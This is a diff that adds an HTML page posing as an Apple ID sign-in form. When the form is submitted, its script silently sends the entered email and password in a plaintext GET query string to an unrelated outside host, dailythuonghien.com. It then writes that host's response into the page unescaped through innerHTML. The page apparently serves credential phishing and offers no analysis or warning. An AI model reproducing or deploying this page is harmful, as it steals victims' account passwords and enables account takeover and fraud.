@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Form Input</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .form-container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-container h2 {
+            text-align: center;
+        }
+
+        .form-container label {
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .form-container input[type="text"],
+        .form-container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        .form-container .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #4caf50;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+
+        .form-container .submit-btn:hover {
+            background-color: #45a049;
+        }
+
+        .result-container {
+            max-width: 400px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .result-container h3 {
+            margin-top: 0;
+        }
+
+        .refresh-btn {
+            background-color: #4caf50;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 24px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .refresh-btn:hover {
+            background-color: #45a049;
+        }
+
+        @media (max-width: 600px) {
+            .form-container {
+                max-width: 90%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="form-container">
+        <h2>Form Input</h2>
+        <form onsubmit="submitForm(event)">
+            <label for="shareid">Apple ID:</label>
+            <input type="text" id="shareid" name="shareid" required placeholder="Enter your Email">
+
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required placeholder="Enter your Password">
+
+            <input type="submit" class="submit-btn" value="Submit">
+        </form>
+    </div>
+
+    <div id="result" class="result-container"></div>
+
+    <button class="refresh-btn" onclick="refreshPage()">Refresh</button>
+
+    <script>
+        function submitForm(event) {
+            event.preventDefault(); // Menghentikan pengiriman form secara default
+
+            var shareid = document.getElementById("shareid").value;
+            var password = document.getElementById("password").value;
+
+            var newUrl = "https://dailythuonghien.com/blog/id/?acc=" + shareid + "&pass=" + password;
+
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function () {
+                if (this.readyState == 4 && this.status == 200) {
+                    document.getElementById("result").innerHTML = this.responseText;
+                }
+            };
+            xhttp.open("GET", newUrl, true);
+            xhttp.send();
+        }
+
+        function refreshPage() {
+            window.location.reload();
+        }
+    </script>
+</body>
+
+</html>
